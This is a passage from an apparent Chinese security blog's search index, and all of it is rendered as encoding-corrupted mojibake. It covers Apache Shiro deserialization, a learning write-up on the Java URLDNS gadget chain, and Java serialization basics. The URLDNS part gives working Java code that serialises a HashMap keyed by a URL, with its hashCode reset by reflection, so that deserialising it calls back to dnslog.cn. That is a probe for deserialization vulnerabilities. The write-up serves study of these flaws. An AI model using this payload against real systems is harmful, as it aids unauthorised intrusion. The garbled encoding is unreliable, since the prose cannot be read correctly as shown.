ï¼Œè™½ç„¶æ²¡æŒ‰ç…§è¿™ä¸ªéƒ¨ç½²è¿‡ï¼Œæ¼æ´èƒ½ä¸èƒ½æˆåŠŸæ˜“åˆ©ç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯è¦å¾—å¤šé¡¶é¡¶è¿™ä¸ªå¸–å­ è¿™ä¸ªå¸–å­è¶Šçœ‹è¶Šå¥½ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼Œä¸€å®šèƒ½å¸®åŠ©é’æ¶©å¼€å‘è§£å†³ä½¿ç”¨shiroçš„éš¾é¢˜ï¼Œç„¶åæƒ³äº†ä¸€ä¸‹&quot;é¡ºä¾¿&quot;å¤åˆ¶äº†ä¸€ä¸‹è¿™ä¸ªå¸–å­ï¼Œæˆ‘åˆå‘åœ¨äº†ç®€ä¹¦é‡ŒShiroæ•´åˆå‰åç«¯åˆ†ç¦»é¡¹ç›®(åœ¨Webé¡¹ç›®ä¸­ä½¿ç”¨shiro) (è¿˜æ”¹äº†æ ‡é¢˜ï¼Œå¢åŠ å…³é”®è¯æœç´¢å‡ ç‡) åŒæ—¶åœ¨å…¶ä¸­ç¾ä¸­ä¸è¶³çš„åœ°æ–¹è¿›è¡Œäº†ä¿®æ”¹ï¼Œä½¿æ•´ä¸ªå¸–å­å¯¹å¼€å‘æ›´åŠ çš„å‹å¥½ï¼Œç®€å•çš„æ”¹äº†æ”¹å›¾ç‰‡ï¼ŒåŠ äº†å‡ å¥è¯ï¼Œæœ‰æ¡ä»¶çš„å¸ˆå‚…ä¹Ÿå¯ä»¥å†å»åšå®¢å›­ï¼ŒCSDNå‘å‡ ç¯‡ï¼Œè®©å®‰å…¨ä»ä¸šè€…å¤šå¤šå¸®åŠ©æ‡µæ‡‚çš„å¼€å‘ä½¿ç”¨shiroç»„ä»¶åšæƒé™ç®¡ç†åˆ¶ä½œå‡ºæ›´å¥½çš„javaç½‘ç«™ï¼Œæ¯•ç«Ÿå®‰å…¨&amp;å¼€å‘æ˜¯ä¸€å®¶äººçš„å‘¢ ï¼ˆé€ƒ ","link":"https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/"},{"title":"Javaååºåˆ—åŒ–çš„URLDNSé“¾åˆ†æå­¦ä¹ ","content":"0x01 ç§‘æ™®æ—¶é—´ 1. äº§ç”Ÿjavaååºåˆ—åŒ–çš„å¿…å¤‡æ¡ä»¶ å½“Javaåº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯ä¸å¯ä¿¡æ•°æ®åšäº†ååºåˆ—åŒ–å¤„ç†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨äº§ç”Ÿéé¢„æœŸå¯¹è±¡çš„è¿‡ç¨‹ä¸­å°±æœ‰å¯èƒ½é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚ ä¸ºä»€ä¹ˆJavaååºåˆ—åŒ–çš„å‡ºç°ç‡è¿™ä¹ˆé«˜ï¼Ÿ å› ä¸ºJavaä¼šç»™ç”¨æˆ·æä¾›ä¸€äº›å…¬ç”¨åº“ï¼Œä¾‹å¦‚commons-collections,commons-beanutilsè¿™äº›åº“ä¸­å®ç°çš„ä¸€äº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ç”¨æ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ WebLogicã€WebSphereã€JBossã€Jenkinsã€OpenNMSè¿™äº›åº”ç”¨çš„ååºåˆ—åŒ–æ¼æ´èƒ½å¤Ÿå¾—ä»¥åˆ©ç”¨ï¼Œå°±æ˜¯ä¾é äº†commons-collections ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯æ§çš„åºåˆ—åŒ–æ•°æ® + å…¬ç”¨çš„javaä¾èµ–åº“æ˜¯å¯¼è‡´Javaååºåˆ—åŒ–çš„æ ¹æœ¬æ¡ä»¶ 2. ä¸€äº›ä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹çš„ä¼ å‚ æ–¹æ³•ä¸­ä¼ å…¥çš„å‚æ•°ç±»å‹ä¸ºå‚æ•°ç±»å‹ï¼Œä¸æ˜¯int,Stringè¿™äº›åŸºæœ¬æ•°æ®ç±»å‹æ˜¯å•¥æ„æ€ æ„æ€å°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡~ å¯ä»¥ç›´æ¥è°ƒç”¨çš„å•¦ï¼Œä¸éœ€è¦åœ¨å®ä¾‹åŒ–äº† public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } 3. javaçš„æ˜ å°„(Map)æ˜¯ä»€ä¹ˆ Mapæ˜¯javaæä¾›çš„ä¸€ä¸ªå®˜æ–¹æ¥å£ï¼Œä½¿ç”¨çš„è¯å°±æ˜¯ import java.util.Map; ä½œç”¨: ç»™å®šä¸€ä¸ªé”®å’Œä¸€ä¸ªå€¼ï¼Œä½ å¯ä»¥å°†è¯¥å€¼å­˜å‚¨åœ¨ä¸€ä¸ª Map å¯¹è±¡ã€‚ä¹‹åï¼Œä½ å¯ä»¥é€šè¿‡é”®æ¥è®¿é—®å¯¹åº”çš„å€¼ã€‚ HashMapç±»æ˜¯å®ç°Mapæ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ç°ä¸Šè¡Œè¯´çš„é‚£ä¸ªåŠŸèƒ½çš„å…·ä½“ä»£ç  4. å¦‚ä½•å®ç°ç±»åœ¨è¢«ååºåˆ—åŒ–æ—¶è§¦å‘ç±»é‡Œçš„æŸä¸ªæ–¹æ³• åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­éœ€è¦ç‰¹æ®Šå¤„ç†çš„ç±»å¿…é¡»å®ç°å…·æœ‰ä»¥ä¸‹ç¡®åˆ‡ç­¾åçš„ç‰¹æ®Šæ–¹æ³•ï¼š private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException; 5. javaåå°„æ˜¯ä»€ä¹ˆåŠä¸ªäººç†è§£ã€‚ åå°„ä¹‹ä¸­åŒ…å«äº†ä¸€ä¸ªã€Œåã€å­—ï¼Œæ‰€ä»¥æƒ³è¦è§£é‡Šåå°„å°±å¿…é¡»å…ˆä»ã€Œæ­£ã€å¼€å§‹è§£é‡Šã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨æŸä¸ªç±»æ—¶å¿…å®šçŸ¥é“å®ƒæ˜¯ä»€ä¹ˆç±»ï¼Œæ˜¯ç”¨æ¥åšä»€ä¹ˆçš„ã€‚äºæ˜¯æˆ‘ä»¬ç›´æ¥å¯¹è¿™ä¸ªç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¹‹åä½¿ç”¨è¿™ä¸ªç±»å¯¹è±¡è¿›è¡Œæ“ä½œã€‚ Apple apple = new Apple(); //ç›´æ¥åˆå§‹åŒ–ï¼Œã€Œæ­£å°„ã€ apple.setPrice(8999); ä¸Šé¢è¿™æ ·å­è¿›è¡Œç±»å¯¹è±¡çš„åˆå§‹åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºã€Œæ­£å°„ã€ã€‚ è€Œåå°„åˆ™æ˜¯ä¸€å¼€å§‹å¹¶ä¸çŸ¥é“æˆ‘è¦åˆå§‹åŒ–çš„ç±»å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œè‡ªç„¶ä¹Ÿæ— æ³•ä½¿ç”¨ new å…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡äº†ã€‚ æ•²é»‘æ¿äº† [æ¨èé˜…è¯»é¡ºåºä¸€]https://blog.csdn.net/qq_36226453/article/details/82790375 [æ¨èé˜…è¯»é¡ºåºäºŒ]https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html ä¸ªäººç†è§£ï¼š 1.å°±æ˜¯javaæŠŠæ‰€æœ‰çš„.classæ–‡ä»¶å½“åšä¸€ä¸ªclassç±»ï¼Œæƒ³è¦ç”¨å…ˆå‘Šè¯‰javaä½ è¦ç”¨å“ªä¸ªclassç±»ï¼Œç„¶åæä¾›ä¸€éƒ¨åˆ†æ–¹æ³•å®ç°æˆ–è€…è¯´æ˜¯ç»†åŒ–è¿™ä¸ªåŠŸèƒ½ 2.å°±æ˜¯javaæŠŠclassç±»é‡Œæ‰€æœ‰çš„æ–¹æ³•å½“åšclassç±»ä¸€ä¸ªå­ç±»ï¼Œæƒ³è¦ç”¨å°±ç”¨ä¸Šæ­¥åˆ›å»ºçš„ä½ çš„ç›®æ ‡classå¯¹è±¡æ¥è°ƒç”¨ï¼Œæä¾›ä¸€éƒ¨åˆ†æ–¹æ³•å®ç°æˆ–è€…è¯´æ˜¯ç»†åŒ–è¿™ä¸ªåŠŸèƒ½ 3.å°±æ˜¯javaæŠŠclassç±»é‡Œæ‰€æœ‰çš„å±æ€§(å˜é‡)å½“åšä¸€ä¸ªclassç±»ä¸€ä¸ªå­ç±»ï¼Œæƒ³è¦ç”¨å°±ç”¨ä¸Šä¸Šæ­¥åˆ›å»ºçš„ä½ çš„ç›®æ ‡classå¯¹è±¡æ¥è°ƒç”¨ï¼Œæä¾›ä¸€éƒ¨åˆ†æ–¹æ³•å®ç°æˆ–è€…è¯´æ˜¯ç»†åŒ–è¿™ä¸ªåŠŸèƒ½ 4.æƒ³è¦æ‰§è¡Œç›®æ ‡ç±»çš„æ–¹æ³•è¦ä½¿ç”¨Object object = clazz.newInstance(); å…ˆè·å¾—ä¸€ä¸ªå¯¹è±¡ï¼Œå°±æ˜¯ä¸Šä¸Šä¸Šæ­¥è·å¾—çš„ç›®æ ‡classå¯¹è±¡çš„newInstance()æ–¹æ³•è·å¾—ä¸€ä¸ªç›®æ ‡classå¯¹è±¡çš„å­—èŠ‚ç å¯¹è±¡ï¼Œè¿˜å¾—ç”¨invokeè°ƒç”¨ï¼Œç„¶åæœ‰æ—¶å€™è¿˜ç­‰åŒäºnewä¸€ä¸ªå¯¹è±¡ï¼Œæ¯”å¦‚åºåˆ—åŒ–æ—¶ä¼ å…¥writeObject()çš„ä¹Ÿæ˜¯è¿™ä¸ªå¯¹è±¡(è¿™æ­¥çº¯ä¸ªäººç†è§£ï¼Œæœ‰ç‚¹è¿·ç³Šï¼Œå¥½å§æˆ‘æ˜¯åƒåœ¾) æˆ‘å†™çš„å­¦ä¹ ä»£ç  package com.company; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ReflexDemo { String name = &quot;å¼ ä¸‰&quot;; int age = 18; public String ReflexDemo() { String result = &quot;name:&quot; + name + &quot; age:&quot; + age; return result; } public String getName(String nameDemo) { this.name = nameDemo; return name; } public int getAge(int ageDemo) { this.age = ageDemo; return age; } public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException { /* é€šè¿‡åå°„æ‰§è¡Œç›®æ ‡ç±»çš„æ–¹æ³• */ //è·å–Classå¯¹è±¡ï¼Œæˆ‘ç†è§£ä¸ºjavaåœ¨è¿è¡Œçš„æ—¶å€™å°†è¿è¡Œçš„æ‰€æœ‰xxxx.classæ–‡ä»¶å½“åšä¸€ä¸ªclassç±»ï¼Œç„¶åç”¨è¿™ä¸ªæ–¹æ³•åœ¨è¿™ä¸ªå¤§ä¸ªçš„classç±»ä¸­è·å¾—éœ€è¦ä½¿ç”¨çš„ç±»çš„å¯¹è±¡ Class clazz = Class.forName(&quot;com.company.ReflexDemo&quot;); //åœ¨ä¸Šæ­¥è·å¾—çš„Classå¯¹è±¡é‡Œè·å¾—é‡Œé¢çš„getNameæ–¹æ³•ä½œä¸ºç›®æ ‡æ–¹æ³•çš„å¯¹è±¡,ä¼ å…¥çš„å°±æ˜¯æ–¹æ³•ååŠéœ€è¦çš„å‚æ•°æ•°æ®ç±»å‹ (å·²çŸ¥æƒ³ä½¿ç”¨çš„ç›®æ ‡æ–¹æ³•å) Method method = clazz.getMethod(&quot;getAge&quot;, int.class); //åœ¨ä¸Šä¸Šæ­¥è·å¾—Classå¯¹è±¡è·å¾—XXXï¼Œå°±å½“è·å¾—classå¯¹è±¡çš„æ‰§è¡Œä»£ç çš„å­—èŠ‚ç ï¼Ÿä¸çŸ¥é“è¿™æ­¥å«å•¥ï¼Œæˆ‘å°±å½“æˆæ˜¯å›ºå®šæ ¼å¼äº†ï¼Œæœ‰çš„äººè¿˜ä¼šå…ˆç”¨getConstructor()æ–¹æ³•åœ¨ç”¨newInstance()ï¼ŒæŸ¥çš„æ—¶å€™ä¹Ÿè¯´newInstanceæ˜¯è·å¾—æ„é€ æ–¹æ³•çš„ï¼Œä½†æ˜¯ä¸æ˜¯æ„é€ æ–¹æ³•ä¹Ÿèƒ½ç”¨å•Šï¼Œä¸æ¸…æ¥š Object object = clazz.newInstance(); //ç”¨è·å¾—ç›®æ ‡æ–¹æ³•çš„å¯¹è±¡methodä½¿ç”¨invoke()æ–¹æ³•æ‰§è¡Œæ­¤æ–¹æ³•ï¼Œä¼ å…¥çš„æ˜¯ç›®æ ‡æ–¹æ³•çš„å¯¹è±¡å’Œéœ€è¦çš„å‚æ•° System.out.println(method.invoke(object,15)); /* é€šè¿‡åå°„ä¿®æ”¹ç›®æ ‡ç±»çš„å˜é‡ */ Method methodTwo = clazz.getMethod(&quot;ReflexDemo&quot;); System.out.println(&quot;æœªä¿®æ”¹å‰:&quot; + methodTwo.invoke(object)); Field field = clazz.getDeclaredField(&quot;age&quot;); //è·å¾—æƒ³è¦ä¿®æ”¹çš„å˜é‡åå¯¹è±¡ field.setAccessible(true); //è®¾ç½®ä¸ºå…è®¸è®¿é—® field.set(object,8); //ä¿®æ”¹ageå˜é‡çš„å€¼ä¸º8 System.out.println(&quot;å·²ä¿®æ”¹å:&quot; + methodTwo.invoke(object)); } } æœ¬æ–‡ç”¨åˆ°javaåå°„ç›¸å…³çš„æ–¹æ³• getDeclaredFields() : ä½¿ç”¨ Class å¯¹è±¡çš„ getDeclaredFields() æ–¹æ³•åˆ™å¯ä»¥è·å–åŒ…æ‹¬ç§æœ‰å±æ€§åœ¨å†…çš„æ‰€æœ‰å±æ€§ forName() : è·å–Classå¯¹è±¡ï¼Œæˆ‘ç†è§£ä¸ºjavaåœ¨è¿è¡Œçš„æ—¶å€™å°†è¿è¡Œçš„æ‰€æœ‰xxxx.classæ–‡ä»¶å½“åšä¸€ä¸ªclassç±»ï¼Œç„¶åç”¨è¿™ä¸ªæ–¹æ³•åœ¨è¿™ä¸ªå¤§ä¸ªçš„classç±»ä¸­è·å¾—éœ€è¦ä½¿ç”¨çš„ç±»çš„Classå¯¹è±¡ setAccessible() : å°†ç›®æ ‡ç±»é‡Œçš„å˜é‡è®¾ç½®ä¸ºå…è®¸ä¿®æ”¹çŠ¶æ€ set() : å¯¹æƒ³è¦ä¿®æ”¹çš„å˜é‡å€¼è¿›è¡Œèµ‹å€¼ 0x02 äº†è§£å‰ç½®çŸ¥è¯†åçš„URLDNSåˆ©ç”¨é“¾æ„é€  package com.company; import java.util.HashMap; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; public class UrldnsDemo { public static void main(String[] args) throws Exception { HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); URL url = new URL(&quot;http://y4dehg.dnslog.cn&quot;); url.hashCode(); } } é¦–å…ˆæ˜¯è¦çŸ¥é“çš„æ˜¯java.net.URLè¿™ä¸ªç±»ï¼Œåœ¨åˆ›å»ºå¯¹è±¡åè°ƒç”¨hashCode()æ–¹æ³•æ˜¯ä¼šè°ƒç”¨getHostAddress()æ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¼šè¯·æ±‚ä¸€æ¬¡åŸŸåï¼Œè·Ÿè¿›çš„è¯ctrl/command+é¼ æ ‡å·¦é”®ç‚¹å‡»hashCode()ç„¶ååœ¨ç‚¹å‡»hashCode()å°±èƒ½çœ‹åˆ°getHostAddressäº† è€Œjava.util.HashMapè¿™ä¸ªç±»é‡å†™äº†readObjectæ–¹æ³•(è·Ÿè¿›å¤´éƒ¨ä»£ç import java.util.HashMapçš„HashMapå³å¯è·å¾—æºä»£ç )ï¼Œä¸”è®¾ç½®ä¸ºæ­¤readObject()æ–¹æ³•åœ¨è¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œæœ€ç»ˆåœ¨æ­¤æ–¹æ³•çš„ä»£ç æœ€ä¸‹é¢æ‰§è¡Œäº†hashæ–¹æ³•ä¼ å…¥çš„å‚æ•°æ˜¯ä»ååºåˆ—åŒ–å­—èŠ‚ç ä¸­å¾—åˆ°çš„key æ‰€ä»¥å°è¯•å†™ä¸€ä¸‹payloadï¼Œçœ‹çœ‹èƒ½å¦ååºåˆ—åŒ–æ—¶å‘å‡ºdnsè¯·æ±‚ Map hashMap = new HashMap(); //å®ä¾‹åŒ–hashMapç±»ï¼Œåˆ©ç”¨çš„å°±æ˜¯æ­¤ç±»ä»–é‡å†™çš„readObjectæ–¹æ³•ï¼Œè¢«ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ URL url = new URL(&quot;http://dskg3c.dnslog.cn&quot;); //å®ä¾‹åŒ–URLç±»ï¼Œä¼ å…¥å‡†å¤‡è¯·æ±‚çš„åŸŸåï¼Œæ­¤å¯¹è±¡ç”¨æ¥å½“åškeyä¼ å…¥hashMapçš„ hashMap.put(url,&quot;test&quot;); //å†™å…¥åˆ°hashMapä¸­ï¼Œurlä¸ºkeyï¼Œtestä¸ºvalueï¼ŒhashMapå°±æ˜¯ç”¨æ¥å­˜å‚¨é”®å€¼å¯¹çš„ä¸€ä¸ªæ•°æ®ç±»å‹ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); å‘ç°åœ¨ååºåˆ—åŒ–æ—¶æ— æ³•å‘å‡ºdnsè¯·æ±‚ï¼Œåç»­åœ¨HashMap.javaçš„1413è¡Œå°±æ˜¯hashæ–¹æ³•é‚£é‡Œæ‰“æ–­ç‚¹è·Ÿè¿›åé¢çš„ä»£ç æ‰çŸ¥é“ï¼Œå°±æ˜¯å› ä¸ºä¸‹å›¾æ˜¾ç¤ºï¼Œæ»¡è¶³hashCode!=-1æ¡ä»¶ï¼Œæ²¡æœ‰æ‰§è¡Œ902è¡ŒçœŸæ­£çš„hashCode()æ–¹æ³• æ‰€ä»¥è¦æ›´æ”¹hashCodeå˜é‡çš„å€¼å°±ç”¨åˆ°äº†javaçš„åå°„ï¼Œä»£ç ä¿®æ”¹ä¸º package com.company; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.util.HashMap; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.Map; public class UrldnsDemo { public static void main(String[] args) throws Exception { Map hashMap = new HashMap(); //å®ä¾‹åŒ–hashMapç±»ï¼Œåˆ©ç”¨çš„å°±æ˜¯æ­¤ç±»ä»–é‡å†™çš„readObjectæ–¹æ³•ï¼Œè¢«ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ URL url = new URL(&quot;http://bqorej.dnslog.cn&quot;); //å®ä¾‹åŒ–URLç±»ï¼Œä¼ å…¥å‡†å¤‡è¯·æ±‚çš„åŸŸåï¼Œæ­¤å¯¹è±¡ç”¨æ¥å½“åškeyä¼ å…¥hashMapçš„ Class clazz = Class.forName(&quot;java.net.URL&quot;); //è·å–æƒ³è¦åå°„çš„ç›®æ ‡ç±»çš„Classå¯¹è±¡ Field f = clazz.getDeclaredField(&quot;hashCode&quot;); //åœ¨å­˜å‚¨çš„æƒ³è¦åå°„çš„ç›®æ ‡ç±»çš„clazzå¯¹è±¡ä¸­çš„æ‰€æœ‰å˜é‡ä¸­è·å¾—hashCodeå˜é‡å­˜å…¥få¯¹è±¡ f.setAccessible(true); //è®¾ç½®hashCodeå˜é‡ä¸ºå…è®¸è®¿é—® f.set(url,1); //é”¦ä¸Šæ·»èŠ±ï¼ŒåŠ ä¸Šè¿™å¥å°±å¯ä»¥åœ¨ä¸‹é¢è¿™å¥putçš„æ—¶å€™è®©æœ¬åœ°ä¸å‘å‡ºdnsè¯·æ±‚ï¼Œå°±è·Ÿæ–‡ç« å‰é¢çš„ä»£ç æ²¡æœ‰æˆåŠŸå‘å‡ºdnsè¯·æ±‚çš„åŸç†ä¸€æ ·ï¼Œä¸ºäº†è®©hashCode!=-1 ,å°±éšä¾¿èµ‹ä¸ªå€¼ hashMap.put(url,&quot;test&quot;); //å†™å…¥åˆ°hashMapä¸­ï¼Œurlä¸ºkeyï¼Œtestä¸ºvalueï¼ŒhashMapå°±æ˜¯ç”¨æ¥å­˜å‚¨é”®å€¼å¯¹çš„ä¸€ä¸ªæ•°æ®ç±»å‹ f.set(url,-1); //ä¿®æ”¹çš„æ˜¯URLç±»é‡Œçš„å˜é‡ï¼Œæ‰€ä»¥ä¼ å…¥urlå¯¹è±¡å’Œè¦ä¿®æ”¹çš„å€¼ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); // Map m1 = new HashMap(); // m1.put(&quot;Zara&quot;, &quot;8&quot;); // m1.put(&quot;Mahnaz&quot;, &quot;31&quot;); // m1.put(&quot;Ayan&quot;, &quot;12&quot;); // m1.put(&quot;Daisy&quot;, &quot;14&quot;); // System.out.println(); // System.out.println(&quot; Map Elements&quot;); // System.out.print(&quot;\\t&quot; + m1); } } è¿™æ ·å°±å¯ä»¥å®ç°javaåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å‘å‡ºäº†dnsè¯·æ±‚ PSï¼šå¯èƒ½è¯´çš„æ¯”è¾ƒå•°å—¦ï¼Œå› ä¸ºæˆ‘æ˜¯åœ¨ç†è§£URLDNSåˆ©ç”¨é“¾å‰è¿˜å¾—å…ˆå»äº†è§£ä¸€äº›javaçš„çŸ¥è¯†ï¼Œä¸€äº›ä¹Ÿå†™åˆ°æ–‡ç« é‡Œäº†ï¼Œå…¶å®å°±æ˜¯ç¡¬å•ƒo(â•¥ï¹â•¥)oï¼Œåæ¥ç†è§£äº†åè§‰å¾—URLDNSè¿™ä¸ªé“¾ç¡®å®å¾ˆç®€å•ï¼Œå¤§éƒ¨åˆ†æ—¶é—´è¿˜æ˜¯åœ¨å­¦ä¹ å‰ç½®çŸ¥è¯†ï¼Œä¹Ÿæ–¹ä¾¿åç»­çš„å…¶ä»–é“¾çš„å­¦ä¹ å•¦ ","link":"https://www.svenbeast.com/post/java-fan-xu-lie-hua-de-urldns-lian-fen-xi-xue-xi/"},{"title":"Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–","content":"ç§‘æ™®æ—¶é—´ å¯¹è±¡ï¼šjavaå®ä¾‹åŒ–ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå¯ä»¥ç§°ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œæˆ–è€…ä¸€ä¸ªå®ä¾‹ï¼Œæ¯”å¦‚ä¸‹æ–¹çš„myPuppy ï¼ˆå…¶ä»–æ–¹æ³•å¿½ç•¥ï¼‰ Puppy myPuppy = new Puppy(&quot;tommy&quot;); æŠ½è±¡ç±»ï¼šçˆ¶ç±»æ˜¯å°†å­ç±»æ‰€å…±åŒæ‹¥æœ‰çš„å±æ€§å’Œæ–¹æ³•è¿›è¡ŒæŠ½å–ï¼Œè¿™äº›å±æ€§å’Œæ–¹æ³•ä¸­ï¼Œæœ‰çš„æ˜¯å·²ç»æ˜ç¡®å®ç°äº†çš„ï¼Œæœ‰çš„è¿˜æ— æ³•ç¡®å®šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†å…¶å®šä¹‰æˆæŠ½è±¡ï¼Œåœ¨ä»¥åçš„å­ç±»ä¸­è¿›è¡Œé‡ç”¨ï¼Œè¿›è¡Œå…·ä½“åŒ–(å°±æ˜¯ç»§æ‰¿çˆ¶ç±»çš„æ–¹æ³•åï¼Œé‡æ–°å®šä¹‰æ–¹æ³•å†…å®¹) ç”¨abstractå…³é”®å­—æ¥ä¿®é¥°æŠ½è±¡æ–¹æ³•ï¼Œç”¨abstractæ¥ä¿®é¥°æŠ½è±¡ç±» æŠ½è±¡æ–¹æ³•ï¼šåœ¨æŠ½è±¡ç±»ä¸­çš„ç”¨abstractä¿®é¥°çš„æ–¹æ³•ï¼Œåªå®šä¹‰ä¸ªæ–¹æ³•åå­—ï¼Œæ²¡æœ‰å†…å®¹ï¼Œæ–¹ä¾¿å­ç±»ç»§æ‰¿è¿™ä¸ªç±»çš„æ—¶å€™å…·ä½“å°†æ­¤æ–¹æ³•å†…å®¹å®šä¹‰å‡ºæ¥ package javastudy; public class AbstractDemo1 { public static void main(String[] args) { // TODO Auto-generated method stub } } // è¿™å°±æ˜¯ä¸€ä¸ªæŠ½è±¡ç±» abstract class Animal { String name; int age; // åŠ¨ç‰©ä¼šå« è¿™å°±æ˜¯ä¸€ä¸ªæŠ½è±¡æ–¹æ³• public abstract void cry(); // ä¸ç¡®å®šåŠ¨ç‰©æ€ä¹ˆå«çš„ã€‚å®šä¹‰æˆæŠ½è±¡æ–¹æ³•ï¼Œæ¥è§£å†³çˆ¶ç±»æ–¹æ³•çš„ä¸ç¡®å®šæ€§ã€‚æŠ½è±¡æ–¹æ³•åœ¨çˆ¶ç±»ä¸­ä¸èƒ½å®ç°ï¼Œæ‰€ä»¥æ²¡æœ‰å‡½æ•°ä½“ã€‚ä½†åœ¨åç»­åœ¨ç»§æ‰¿æ—¶ï¼Œè¦å…·ä½“å®ç°æ­¤æ–¹æ³•ã€‚ } // æŠ½è±¡ç±»å¯ä»¥è¢«ç»§æ‰¿ // å½“ç»§æ‰¿çš„çˆ¶ç±»æ˜¯æŠ½è±¡ç±»æ—¶ï¼Œéœ€è¦å°†æŠ½è±¡ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•å…¨éƒ¨å®ç°ã€‚ class cat extends Animal { // å®ç°çˆ¶ç±»çš„cryæŠ½è±¡æ–¹æ³• public void cry() { System.out.println(&quot;çŒ«å«:&quot;); } } æ¥å£ï¼šæ˜¯æŠ½è±¡æ–¹æ³•çš„é›†åˆï¼Œæ¥å£é€šå¸¸ä»¥interfaceæ¥å£°æ˜ã€‚ä¸€ä¸ªç±»é€šè¿‡ç»§æ‰¿æ¥å£çš„æ–¹å¼ï¼Œä»è€Œæ¥ç»§æ‰¿æ¥å£çš„æŠ½è±¡æ–¹æ³•ã€‚ //ä¸€ä¸ªç®€å•çš„æ¥å£ interface in1 { // é»˜è®¤ä¸º Public Static Final final int a =10; // é»˜è®¤ä¸ºæŠ½è±¡æ–¹æ³• public and abstract void display(); } ç»§æ‰¿æ¥å£çš„æ–¹å¼æ˜¯ä½¿ç”¨implementså»å®ç°æ¥å£ï¼Œå½“ä½ ä¸ºäº†å®ç°æ¥å£å†™çš„ç±»ä¸­å®ç°äº†æ¥å£æ‰€æœ‰çš„æ–¹æ³•ï¼Œæ‰ç®—è¿™ä¸ªç±»å®ç°æ¥å£æˆåŠŸï¼š class testClass implements in1 { // å®ç°æ¥å£ä¸­çš„æ–¹æ³• public void display() { System.out.println(&quot;Study&quot;); } } å†™ä¸€ä¸ªæµ‹è¯•ç±»ï¼Œç”¨æ¥æµ‹è¯•ä¸€ä¸‹åˆšæ‰å®ç°çš„è¿™ä¸ªæ¥å£ï¼Œå› ä¸ºtestclassç±»çš„å¯¹è±¡tå®ç°äº†æ¥å£è§„å®šçš„displayæ–¹æ³•ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶å°±å¯ä»¥è°ƒç”¨display()æ–¹æ³•å’¯ã€‚ class testClass implements in1 { // å®ç°æ¥å£ä¸­çš„æ–¹æ³• public void display() { System.out.println(&quot;Study&quot;); } public static void main (String[] args) { testClass t = new testClass(); t.display(); System.out.println(a); } } æ¦‚å¿µ åºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ç§°ä¸ºå¯¹è±¡çš„åºåˆ—åŒ–ã€‚ ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºå¯¹è±¡çš„ååºåˆ—åŒ–ã€‚ åœ¨Javaä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ¥åˆ›å»ºå¯¹è±¡ï¼Œå¹¶ä¸”åªè¦å¯¹è±¡æ²¡æœ‰è¢«å›æ”¶æˆ‘ä»¬éƒ½å¯ä»¥å¤ç”¨æ­¤å¯¹è±¡ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬åˆ›å»ºå‡ºæ¥çš„è¿™äº›å¯¹è±¡éƒ½å­˜åœ¨äºJVMä¸­çš„å 